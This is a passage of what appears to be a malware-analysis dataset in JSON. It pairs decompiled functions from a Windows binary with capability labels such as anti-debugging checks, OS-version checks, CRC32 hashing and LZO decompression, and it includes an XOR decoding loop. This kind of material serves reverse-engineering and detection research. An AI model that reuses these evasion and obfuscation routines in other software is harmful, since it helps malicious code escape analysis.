        "decompiled_code": "\nvoid fcn.0049ab00(void)\n\n{\n    if (*0x4f59f4 != 0) {\n        LOCK();\n    }\n    if (*0x4f6f50 == 2) {\n        *0x4f6f50 = 1;\n        fcn.00469d50();\n        fcn.00469d50();\n        fcn.00469d50();\n        fcn.0047f9e0();\n        fcn.0047f9e0();\n        fcn.0047f9e0();\n        return;\n    }\n    *0x4f6f50 = *0x4f6f50 + -1;\n    return;\n}\n",
        "token_count": 151
    },
    "0040f2e0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t fcn.0040f2e0(void)\n\n{\n    char *pcVar1;\n    int32_t in_EAX;\n    int32_t *piVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint32_t uVar8;\n    uint32_t *puVar9;\n    uint8_t uVar10;\n    uint *puVar11;\n    uint8_t *puVar12;\n    uint8_t *puVar13;\n    char cVar14;\n    int32_t iStack32;\n    \n    pcVar1 = *(in_EAX + 0xc);\n    cVar14 = *pcVar1;\n    if (cVar14 == 'S') {\n        if (pcVar1[1] == 't') {\n            *(in_EAX + 0xc) = pcVar1 + 2;\n            uVar7 = fcn.00410650();\n            iVar4 = *(in_EAX + 0x14);\n            if (iVar4 < *(in_EAX + 0x18)) {\n                puVar11 = iVar4 * 0x10 + *(in_EAX + 0x10);\n                *(in_EAX + 0x14) = iVar4 + 1;\n                puVar11[1] = 0;\n                *puVar11 = 0;\n                puVar11[2] = 0x503791;\n                puVar11[3] = 3;\n            }\n            iVar4 = fcn.0040df00(uVar7);\n            *(in_EAX + 0x2c) = *(in_EAX + 0x2c) + 3;\n            cVar14 = **(in_EAX + 0xc);\njoined_r0x0040f53d:\n            if (cVar14 != 'I') {\n                return iVar4;\n            }\n            if ((iVar4 == 0) || (iVar5 = *(in_EAX + 0x20),  *(in_EAX + 0x24) <= iVar5)) goto code_r0x0040f456;\n            *(*(in_EAX + 0x1c) + iVar5 * 4) = iVar4;\n            *(in_EAX + 0x20) = iVar5 + 1;\n        }\n        else {\n            iVar4 = fcn.0040e440();\n            if (**(in_EAX + 0xc) != 'I') {\n                return iVar4;\n            }\n        }\n        uVar7 = fcn.0040f2b0();\n        iVar4 = fcn.0040df00(uVar7);\n    }\n    else {\n        if (cVar14 < 'T') {\n            if (cVar14 != 'N') goto code_r0x0040f480;\n            *(in_EAX + 0xc) = pcVar1 + 1;\n            piVar2 = fcn.00410350();\n            if (piVar2 != NULL) {\n                iVar5 = fcn.0040df60();\n                puVar12 = *(in_EAX + 0xc);\n                uVar8 = *puVar12;\n                iVar4 = 0;\ncode_r0x0040f3d3:\n                cVar14 = uVar8;\n                if (cVar14 != '\\0') {\n                    puVar13 = puVar12;\n                    if (cVar14 == 'D') {\n                        if ((puVar12[1] & 0xdf) != 0x54) {\n                            iVar6 = fcn.00410650();\n                            goto code_r0x0040f562;\n                        }\n                        iVar6 = fcn.0040f7c0();\n                        goto code_r0x0040f562;\n                    }\ncode_r0x0040f3e0:\n                    cVar14 = uVar8;\n                    if (0x1c < uVar8 - 0x30) {\n                        if (cVar14 + 0x9fU < 0x1a) goto code_r0x0040f3f9;\n                        if (cVar14 != 'U') {\n                            if (cVar14 != 'S') goto code_r0x0040f640;\n                            iVar6 = fcn.0040e440();\n                            if (iVar4 != 0) goto code_r0x0040f40d;\n                            puVar12 = *(in_EAX + 0xc);\n                            uVar8 = *puVar12;\n                            iVar4 = iVar6;\n                            goto code_r0x0040f3d3;\n                        }\n                        iVar6 = fcn.00410650();\n                        if (iVar4 != 0) goto code_r0x0040f40d;\ncode_r0x0040f56f:\n                        puVar13 = *(in_EAX + 0xc);\n                        uVar10 = *puVar13;\n                        goto code_r0x0040f426;\n                    }\n                    if ((0x100803ffU >> (uVar8 - 0x30 & 0x1f) & 1) == 0) {\ncode_r0x0040f640:\n                        if (cVar14 != 'I') {\n                            if (cVar14 == 'T') {\n                                iVar6 = fcn.0040e210();\ncode_r0x0040f562:\n                                if (iVar4 == 0) goto code_r0x0040f56f;\n                                goto code_r0x0040f40d;\n                            }\n                            if (cVar14 == 'E') {\n                                *piVar2 = iVar4;\n                                if (iVar4 != 0) {\n                                    if (iVar5 != 0) {\n                                        *(iVar5 + 8) = iStack32;\n                                        iStack32 = iVar5;\n                                    }\n                                    if (*puVar13 == 0x45) {\n                                        *(in_EAX + 0xc) = puVar13 + 1;\n                                        return iStack32;\n                                    }\n                                }\n                                goto code_r0x0040f456;\n                            }\n                            if ((iVar4 == 0) || (cVar14 != 'M')) goto code_r0x0040f450;\n                            puVar12 = puVar13 + 1;\n                            *(in_EAX + 0xc) = puVar12;\n                            uVar8 = puVar13[1];\n                            goto code_r0x0040f3d3;\n                        }\n                        if (iVar4 == 0) goto code_r0x0040f450;\n                        *(in_EAX + 0xc) = puVar13 + 1;\n                        iVar6 = fcn.0040f1a0();\ncode_r0x0040f40d:\n                        iVar6 = fcn.0040df00(iVar6);\n                    }\n                    else {\ncode_r0x0040f3f9:\n                        iVar6 = fcn.00410650();\n                        if (iVar4 != 0) goto code_r0x0040f40d;\n                    }\n                    puVar13 = *(in_EAX + 0xc);\n                    uVar10 = *puVar13;\n                    puVar12 = puVar13;\n                    if (cVar14 == 'S') goto code_r0x0040f44a;\ncode_r0x0040f426:\n                    if (uVar10 != 0x45) goto code_r0x0040f42f;\n                    uVar8 = 0x45;\n                    iVar4 = iVar6;\n                    goto code_r0x0040f3e0;\n                }\ncode_r0x0040f450:\n                *piVar2 = 0;\n            }\n        }\n        else {\n            if (cVar14 == 'U') {\n                iVar4 = fcn.00410650();\n                return iVar4;\n            }\n            if (cVar14 != 'Z') {\ncode_r0x0040f480:\n                iVar4 = fcn.00410650();\n                cVar14 = **(in_EAX + 0xc);\n                goto joined_r0x0040f53d;\n            }\n            *(in_EAX + 0xc) = pcVar1 + 1;\n            piVar2 = fcn.00410a50();\n            if ((piVar2 != NULL) && (pcVar1 = *(in_EAX + 0xc),  *pcVar1 == 'E')) {\n                *(in_EAX + 0xc) = pcVar1 + 1;\n                if (pcVar1[1] == 's') {\n                    *(in_EAX + 0xc) = pcVar1 + 2;\n                    iVar4 = fcn.0040e6e0();\n                    if (iVar4 != 0) {\n                        iVar4 = *(in_EAX + 0x14);\n                        if (iVar4 < *(in_EAX + 0x18)) {\n                            puVar3 = iVar4 * 0x10 + *(in_EAX + 0x10);\n                            *(in_EAX + 0x14) = iVar4 + 1;\n                            puVar3[1] = 0;\n                            *puVar3 = 0;\n                            puVar3[2] = \"string literal\";\n                            puVar3[3] = 0xe;\n                            goto code_r0x0040f369;\n                        }\ncode_r0x0040f78b:\n                        puVar3 = NULL;\ncode_r0x0040f369:\n                        if ((*piVar2 == 3) && (*piVar2[3] == 0x29)) {\n                            piVar2[3][2] = 0;\n                        }\n                        iVar4 = fcn.0040df00(puVar3);\n                        return iVar4;\n                    }\n                }\n                else if (pcVar1[1] == 'd') {\n                    *(in_EAX + 0xc) = pcVar1 + 2;\n                    uVar8 = fcn.0040e1d0();\n                    if ((-1 < uVar8) &&\n                       (((puVar9 = fcn.0040f2e0(),  puVar9 == NULL || ((*puVar9 & 0xfffffffd) == 0x45)) ||\n                        (iVar4 = fcn.0040e6e0(),  iVar4 != 0)))) {\n                        iVar4 = *(in_EAX + 0x14);\n                        if (iVar4 < *(in_EAX + 0x18)) {\n                            puVar3 = iVar4 * 0x10 + *(in_EAX + 0x10);\n                            puVar3[1] = 0;\n                            *(in_EAX + 0x14) = iVar4 + 1;\n                            *puVar3 = 0x46;\n                            puVar3[3] = uVar8;\n                            puVar3[2] = puVar9;\n                            goto code_r0x0040f369;\n                        }\n                        goto code_r0x0040f78b;\n                    }\n                }\n                else {\n                    puVar3 = fcn.0040f2e0();\n                    if (((puVar3 == NULL) || ((*puVar3 & 0xfffffffd) == 0x45)) || (iVar4 = fcn.0040e6e0(),  iVar4 != 0))\n                    goto code_r0x0040f369;\n                }\n            }\n        }\ncode_r0x0040f456:\n        iVar4 = 0;\n    }\n    return iVar4;\ncode_r0x0040f42f:\n    if ((iVar6 == 0) || (iVar4 = *(in_EAX + 0x20),  *(in_EAX + 0x24) <= iVar4)) goto code_r0x0040f450;\n    *(*(in_EAX + 0x1c) + iVar4 * 4) = iVar6;\n    *(in_EAX + 0x20) = iVar4 + 1;\n    uVar10 = *puVar13;\n    puVar12 = puVar13;\ncode_r0x0040f44a:\n    uVar8 = uVar10;\n    iVar4 = iVar6;\n    goto code_r0x0040f3d3;\n}\n",
        "token_count": 2658
    },
    "0041ba40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041ba40(uint param_1, int32_t *param_2)\n\n{\n    uint16_t uVar1;\n    uint32_t *in_EAX;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t uStack56;\n    int32_t iStack48;\n    uint32_t auStack32 [4];\n    \n    if (*param_2 == 0) {\n        iStack48 = 0;\n    }\n    else {\n        iStack48 = 0;\n        iVar3 = 0;\n        do {\n            iVar5 = iVar3;\n            if (param_2[1] != 0) {\n                iVar5 = param_2 + (4 - param_2[1]);\n                if (iVar5 != iVar3) {\n                    uVar2 = fcn.0041b950();\n                    if (uVar2 == 0xff) {\n                        return -1;\n                    }\n                    fcn.0041b760();\n                    uVar1 = *(in_EAX + 4);\n                    if ((uVar1 & 0x7f8) == 0x7f8) {\n                        uStack56 = uVar2;\n                        *(in_EAX + 4) = uVar1 & 0xf807 | uStack56 << 3;\n                    }\n                    else if (uVar1 >> 3 != uVar2) {\n                        *(in_EAX + 4) = *(in_EAX + 4) | 4;\n                    }\n                }\n                fcn.0041b7a0(auStack32);\n                uVar2 = fcn.0041b710();\n                uVar4 = 0xffffffff;\n                if (uVar2 < 4) {\n                    uVar4 = (1 << (uVar2 * '\\b' & 0x1fU)) - 1;\n                }\n                if (((auStack32[0] & uVar4) != 0) &&\n                   (iStack48 = iStack48 + 1,  auStack32[0] <= *in_EAX && *in_EAX != auStack32[0])) {\n                    *in_EAX = auStack32[0];\n                }\n            }\n            param_2 = param_2 + *param_2 + 4;\n            iVar3 = iVar5;\n        } while (*param_2 != 0);\n    }\n    return iStack48;\n}\n",
        "token_count": 542
    },
    "0041bb90": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041bb90(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iStack56;\n    uint32_t auStack32 [4];\n    \n    uVar5 = *(in_EAX + 0x10) >> 3;\n    fcn.0041b760();\n    if (*param_1 != 0) {\n        iStack56 = 0;\n        do {\n            while (param_1[1] != 0) {\n                if (((*(in_EAX + 0x10) & 4) != 0) && (iVar4 = param_1 + (4 - param_1[1]),  iVar4 != iStack56)) {\n                    uVar5 = fcn.0041b950();\n                    fcn.0041b760();\n                    iStack56 = iVar4;\n                }\n                if (uVar5 == 0) {\n                    if (param_1[2] != 0) goto code_r0x0041bbd7;\n                    break;\n                }\n                fcn.0041b7a0(auStack32);\n                uVar2 = fcn.0041b710();\n                uVar3 = 0xffffffff;\n                if (uVar2 < 4) {\n                    uVar3 = (1 << (uVar2 * '\\b' & 0x1fU)) - 1;\n                }\n                if ((auStack32[0] & uVar3) != 0) {\ncode_r0x0041bbd7:\n                    iVar4 = *param_2;\n                    if (iVar4 != 0) {\n                        iVar1 = *(iVar4 + 4);\n                        *(iVar4 + 4) = iVar1 + 1;\n                        *(iVar4 + 8 + iVar1 * 4) = param_1;\n                    }\n                    break;\n                }\n                param_1 = param_1 + *param_1 + 4;\n                if (*param_1 == 0) {\n                    return;\n                }\n            }\n            param_1 = param_1 + *param_1 + 4;\n        } while (*param_1 != 0);\n    }\n    return;\n}\n",
        "token_count": 524
    },
    "0041bca0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0041bca0(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iStack56;\n    uint32_t uStack36;\n    uint32_t auStack32 [4];\n    \n    uVar3 = *(in_EAX + 0x10) >> 3;\n    fcn.0041b760();\n    iVar4 = *param_2;\n    iStack56 = 0;\n    do {\n        if (iVar4 == 0) {\n            return NULL;\n        }\n        if (param_2[1] != 0) {\n            if (((*(in_EAX + 0x10) & 4) != 0) && (iVar4 = param_2 + (4 - param_2[1]),  iVar4 != iStack56)) {\n                uVar3 = fcn.0041b950();\n                fcn.0041b760();\n                iStack56 = iVar4;\n            }\n            if (uVar3 == 0) {\n                uStack36 = param_2[2];\n                auStack32[0] = param_2[3];\n                if ((uStack36 != 0) && (param_1 - uStack36 < auStack32[0])) {\n                    return param_2;\n                }\n            }\n            else {\n                fcn.0041b7a0(&uStack36);\n                fcn.0041b7a0(auStack32);\n                uVar1 = fcn.0041b710();\n                uVar2 = 0xffffffff;\n                if (uVar1 < 4) {\n                    uVar2 = (1 << (uVar1 * '\\b' & 0x1fU)) - 1;\n                }\n                if (((uStack36 & uVar2) != 0) && (param_1 - uStack36 < auStack32[0])) {\n                    return param_2;\n                }\n            }\n        }\n        param_2 = param_2 + *param_2 + 4;\n        iVar4 = *param_2;\n    } while( true );\n}\n",
        "token_count": 501
    },
    "00422260": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00422260(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint8_t auStack32 [16];\n    \n    *(param_1 + 0xc) = 0xffffffff;\n    uVar1 = *(param_1 + 4);\n    if (in_EAX == 0) {\n        if ((uVar1 & 0x100) == 0) {\n            if ((uVar1 & 0x40) == 0) {\n                puVar3 = auStack32;\n            }\n            else {\n                auStack32[0] = 0x20;\n                puVar3 = auStack32 + 1;\n            }\n        }\n        else {\n            auStack32[0] = 0x2b;\n            puVar3 = auStack32 + 1;\n        }\n    }\n    else {\n        puVar3 = auStack32 + 1;\n        auStack32[0] = 0x2d;\n    }\n    iVar2 = 0;\n    do {\n        puVar3[iVar2] = *(param_2 + iVar2) & 0xdf | uVar1 & 0x20;\n        iVar2 = iVar2 + 1;\n    } while (iVar2 != 3);\n    fcn.00422140();\n    return;\n}\n",
        "token_count": 320
    },
    "00420f70": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid fcn.00420f70(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    iVar2 = 7;\n    uVar1 = 0;\n    do {\n        uVar1 = uVar1 + *(param_1 + 2 + iVar2 * 2) + *(param_2 + 2 + iVar2 * 2);\n        *(param_2 + 2 + iVar2 * 2) = uVar1;\n        uVar1 = uVar1 >> 0x10 & 1;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    return;\n}\n",
        "token_count": 157
    },
    "00420ff0": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nbool fcn.00420ff0(int32_t param_1, ushort *param_2)\n\n{\n    uint16_t uVar1;\n    int16_t iVar2;\n    uint16_t uVar3;\n    int32_t iVar4;\n    uint16_t *puVar5;\n    uint32_t uVar7;\n    uint16_t *puVar8;\n    uint16_t *puVar9;\n    bool bVar10;\n    uint *puStack92;\n    int16_t iStack86;\n    ushort auStack54 [2];\n    uint uStack50;\n    uint uStack46;\n    uint uStack42;\n    ushort uStack38;\n    uint uStack36;\n    uint16_t auStack32 [8];\n    uint16_t *puVar6;\n    \n    uVar7 = 0;\n    uStack38 = 0;\n    uStack50 = 0;\n    uStack46 = 0;\n    uStack42 = 0;\n    auStack54[0] = *param_2;\n    auStack54[1] = param_2[1];\n    puVar8 = param_2 + 2;\n    puVar5 = puVar8;\n    do {\n        if ((*puVar5 & 1) != 0) {\n            uVar7 = uVar7 | 1;\n        }\n        uVar3 = *puVar5 >> 1;\n        if ((uVar7 & 2) != 0) {\n            uVar3 = uVar3 | 0x8000;\n        }\n        puVar9 = puVar5 + 1;\n        uVar7 = uVar7 * 2;\n        *puVar5 = uVar3;\n        puVar5 = puVar9;\n    } while (puVar9 != param_2 + 9);\n    uVar3 = *(param_1 + 6);\n    puStack92 = &uStack50;\n    do {\n        if (uVar3 * 0xffff < CONCAT22(param_2[2], param_2[3])) {\n            iStack86 = -1;\n        }\n        else {\n            iStack86 = CONCAT22(param_2[2], param_2[3]) / uVar3;\n        }\n        fcn.00420c50();\n        iVar4 = 2;\n        while( true ) {\n            uVar1 = param_2[iVar4];\n            puVar5 = &uStack36 + iVar4 * 2;\n            bVar10 = *puVar5 == uVar1;\n            iVar2 = iStack86;\n            if (!bVar10) break;\n            iVar4 = iVar4 + 1;\n            if (iVar4 == 9) goto code_r0x004210df;\n        }\n        if (*puVar5 < uVar1 || bVar10) goto code_r0x004210df;\n        iVar4 = 7;\n        uVar7 = 0;\n        do {\n            uVar7 = (*(&uStack36 + iVar4 * 2 + 2) - *(param_1 + 2 + iVar4 * 2)) - uVar7;\n            *(&uStack36 + iVar4 * 2 + 2) = uVar7;\n            uVar7 = uVar7 >> 0x10 & 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n        iVar4 = 2;\n        do {\n            uVar1 = param_2[iVar4];\n            puVar5 = &uStack36 + iVar4 * 2;\n            bVar10 = *puVar5 != uVar1;\n            iVar2 = iStack86 + -1;\n            if (bVar10) {\n                if (uVar1 <= *puVar5 && bVar10) {\n                    iVar4 = 7;\n                    uVar7 = 0;\n                    do {\n                        uVar7 = (*(&uStack36 + iVar4 * 2 + 2) - *(param_1 + 2 + iVar4 * 2)) - uVar7;\n                        *(&uStack36 + iVar4 * 2 + 2) = uVar7;\n                        uVar7 = uVar7 >> 0x10 & 1;\n                        iVar4 = iVar4 + -1;\n                        iVar2 = iStack86 + -2;\n                    } while (iVar4 != 0);\n                }\n                break;\n            }\n            iVar4 = iVar4 + 1;\n        } while (iVar4 != 9);\ncode_r0x004210df:\n        iStack86 = iVar2;\n        iVar4 = 7;\n        uVar7 = 0;\n        do {\n            uVar7 = (param_2[iVar4 + 1] - *(&uStack36 + iVar4 * 2 + 2)) - uVar7;\n            param_2[iVar4 + 1] = uVar7;\n            uVar7 = uVar7 >> 0x10 & 1;\n            iVar4 = iVar4 + -1;\n        } while (iVar4 != 0);\n        *puStack92 = iStack86;\n        puVar5 = puVar8;\n        do {\n            puVar6 = puVar5 + 1;\n            *puVar5 = *puVar6;\n            puVar5 = puVar6;\n        } while (puVar6 != param_2 + 8);\n        puStack92 = puStack92 + 2;\n        param_2[8] = 0;\n        if (&uStack36 == puStack92) {\n            uVar3 = 0;\n            do {\n                puVar5 = puVar8 + 1;\n                uVar3 = uVar3 | *puVar8;\n                puVar8 = puVar5;\n            } while (puVar5 != puVar9);\n            iVar4 = 0;\n            do {\n                param_2[iVar4] = auStack54[iVar4];\n                iVar4 = iVar4 + 1;\n            } while (iVar4 != 9);\n            return uVar3 != 0;\n        }\n    } while( true );\n}\n",
        "token_count": 1318
    },
    "00421250": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint16_t fcn.00421250(int32_t param_1, uint16_t *param_2)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    int16_t *piVar3;\n    int32_t iVar4;\n    uint16_t uVar5;\n    uint16_t auStack50 [8];\n    uint16_t auStack34 [2];\n    uint uStack30;\n    uint uStack26;\n    uint uStack22;\n    uint16_t uStack18;\n    \n    uVar5 = 0;\n    uStack30 = 0;\n    uStack26 = 0;\n    uStack22 = 0;\n    piVar3 = param_1 + 0x10;\n    auStack34[0] = *param_2;\n    auStack34[1] = param_2[1];\n    uStack18 = 0;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + -1;\n        if (iVar1 != 0) {\n            iVar4 = 7;\n            fcn.00420c50();\n            uVar2 = 0;\n            do {\n                uVar2 = uVar2 + auStack50[iVar4] + auStack34[iVar4 + 1];\n                auStack34[iVar4 + 1] = uVar2;\n                uVar2 = uVar2 >> 0x10 & 1;\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        uVar5 = uVar5 | uStack18;\n        uStack18 = uStack22._2_2_;\n        uStack22 = CONCAT22(uStack22, uStack26._2_2_);\n        uStack26 = CONCAT22(uStack26, uStack30._2_2_);\n        uStack30 = uStack30 << 0x10;\n    } while (param_1 + 4 != piVar3);\n    iVar4 = 0;\n    do {\n        param_2[iVar4] = auStack34[iVar4];\n        iVar4 = iVar4 + 1;\n    } while (iVar4 != 9);\n    return uVar5;\n}\n",
        "token_count": 487
    },
    "00424190": {
        "rules": [
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t fcn.00424190(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t *puVar6;\n    uint32_t *puVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint32_t *puVar10;\n    int32_t iVar12;\n    uint32_t uStack84;\n    uint32_t uStack68;\n    uint32_t *puStack60;\n    int32_t iStack48;\n    uint32_t *puVar11;\n    \n    iVar5 = *(param_2 + 0x10);\n    uVar2 = 0;\n    if (iVar5 <= *(param_1 + 0x10)) {\n        puStack60 = param_2 + 0x14;\n        iStack48 = iVar5 + -1;\n        puVar7 = param_1 + 0x14;\n        puVar1 = puStack60 + iStack48;\n        puVar6 = puVar7 + iStack48;\n        uVar2 = *puVar6 / (*puVar1 + 1);\n        if (uVar2 != 0) {\n            uStack68 = 0;\n            uStack84 = 0;\n            puVar8 = puVar7;\n            puVar10 = puStack60;\n            do {\n                puVar11 = puVar10 + 1;\n                uVar9 = *puVar8;\n                uVar3 = uVar2 * *puVar10;\n                uVar4 = uVar3 + uStack68;\n                uStack68 = (uVar2 * *puVar10 >> 0x20) + CARRY4(uVar3, uStack68);\n                uVar3 = uVar9 - uVar4;\n                *puVar8 = uVar3 - uStack84;\n                uStack84 = -(uVar3 < uStack84) - (uVar9 < uVar4) & 1;\n                puVar8 = puVar8 + 1;\n                puVar10 = puVar11;\n            } while (puVar11 <= puVar1);\n            if (*puVar6 == 0) {\n                if ((puVar7 < puVar6 + -1) && (puVar6[-1] == 0)) {\n                    do {\n                        iStack48 = iStack48 + -1;\n                        if (iStack48 == (iVar5 + -2) - (puVar6 + (-5 - puVar7) >> 2)) break;\n                    } while (puVar6[iStack48 - iVar5] == 0);\n                }\n                *(param_1 + 0x10) = iStack48;\n            }\n        }\n        iVar5 = fcn.00427020(param_1, param_2);\n        if (-1 < iVar5) {\n            uVar9 = 0;\n            uVar2 = uVar2 + 1;\n            puVar6 = puVar7;\n            do {\n                puVar8 = puStack60 + 1;\n                uVar3 = *puVar6 - *puStack60;\n                uVar4 = uVar3 - uVar9;\n                uVar9 = -(uVar3 < uVar9) - (*puVar6 < *puStack60) & 1;\n                *puVar6 = uVar4;\n                puVar6 = puVar6 + 1;\n                puStack60 = puVar8;\n            } while (puVar8 <= puVar1);\n            puVar1 = puVar7 + iStack48;\n            if (*puVar1 == 0) {\n                iVar5 = iStack48;\n                if ((puVar7 < puVar1 + -1) && (puVar1[-1] == 0)) {\n                    iVar5 = iStack48 + -1;\n                    iVar12 = iVar5 - (puVar1 + (-5 - puVar7) >> 2);\n                    while ((iVar5 != iVar12 && (puVar1[(iVar5 + -1) - iStack48] == 0))) {\n                        iVar5 = iVar5 + -1;\n                    }\n                }\n                iStack48 = iVar5;\n                *(param_1 + 0x10) = iStack48;\n            }\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 969
    },
    "00421ec0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00421ef6)\n// WARNING: Removing unreachable block (ram,0x00421f90)\n// WARNING: Removing unreachable block (ram,0x00421eff)\n\nvoid fcn.00421ec0(uint param_1, uint param_2, uint32_t param_3, uint param_4, uint param_5, uint param_6, \n                 uint32_t *param_7)\n\n{\n    float10 fVar1;\n    int32_t iVar2;\n    uint uStack44;\n    uint uStack40;\n    ushort uStack36;\n    ushort uStack34;\n    uint uStack32;\n    uint auStack20 [4];\n    \n    uStack44 = param_1;\n    uStack40 = param_2;\n    uStack36 = param_3;\n    uStack34 = param_3 >> 0x10;\n    fVar1 = CONCAT28(uStack36, CONCAT44(param_2, param_1));\n    uStack32 = param_4;\n    if (fVar1 == 0) {\n        auStack20[0] = 0;\n        iVar2 = 0;\n    }\n    else if (fVar1 == 0) {\n        auStack20[0] = 2;\n        iVar2 = -0x403d;\n    }\n    else {\n        auStack20[0] = 1;\n        iVar2 = (param_3 & 0x7fff) - 0x403e;\n    }\n    *param_7 = param_3 & 0x8000;\n    fcn.004243a0(0x4f5a44, iVar2, &uStack44, auStack20);\n    return;\n}\n",
        "token_count": 376
    },
    "004a37e0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t fcn.004a37e0(void)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t iVar3;\n    \n    ppiVar2 = fcn.004a3950();\n    piVar1 = *ppiVar2;\n    if (piVar1 != NULL) {\n        iVar3 = *piVar1;\n        if ((*(piVar1 + 0xc) & 1) != 0) {\n            iVar3 = *(iVar3 + -0x50);\n        }\n        return iVar3;\n    }\n    return 0;\n}\n",
        "token_count": 133
    },
    "0040166b": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.0040166b(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    uint var_8h;\n    \n    for (uVar1 = 0; uVar1 != arg_10h; uVar1 = uVar1 + 1) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(0);\n        *(arg_ch + uVar1) = *(arg_ch + uVar1) ^ ((*(arg_8h + (uVar1 % arg_14h >> 2)) * 0xac0) / 0x3f4) * '\\v';\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00426330": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nvoid fcn.00426330(int32_t param_1, uint32_t param_2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    uint32_t *puVar3;\n    int8_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint32_t *puVar7;\n    uint32_t *puVar8;\n    uint32_t *puVar9;\n    uint var_10h;\n    uint var_14h;\n    uint8_t uStack28;\n    \n    puVar1 = param_1 + 0x14;\n    if (param_2 >> 5 < *(param_1 + 0x10)) {\n        puVar2 = puVar1 + (param_2 >> 5);\n        puVar3 = puVar1 + *(param_1 + 0x10);\n        if ((param_2 & 0x1f) == 0) {\n            puVar7 = puVar2;\n            puVar8 = puVar1;\n            if (puVar3 <= puVar2) goto code_r0x004263e0;\n            do {\n                puVar9 = puVar7 + 1;\n                *puVar8 = *puVar7;\n                puVar7 = puVar9;\n                puVar8 = puVar8 + 1;\n            } while (puVar9 < puVar3);\n            iVar6 = (~puVar2 + puVar3 & 0xfffffffc) + 4;\n            puVar7 = puVar1 + iVar6;\n        }\n        else {\n            iVar4 = param_2 & 0x1f;\n            uStack28 = 0x20 - iVar4;\n            puVar8 = puVar2 + 1;\n            uVar5 = *puVar2 >> iVar4;\n            puVar7 = puVar1;\n            if (puVar8 < puVar3) {\n                do {\n                    puVar9 = puVar8 + 1;\n                    *puVar7 = uVar5 | *puVar8 << (uStack28 & 0x1f);\n                    uVar5 = *puVar8 >> iVar4;\n                    puVar8 = puVar9;\n                    puVar7 = puVar7 + 1;\n                } while (puVar9 < puVar3);\n                puVar7 = param_1 + 0x18 + (puVar3 + (-5 - puVar2) & 0xfffffffcU);\n            }\n            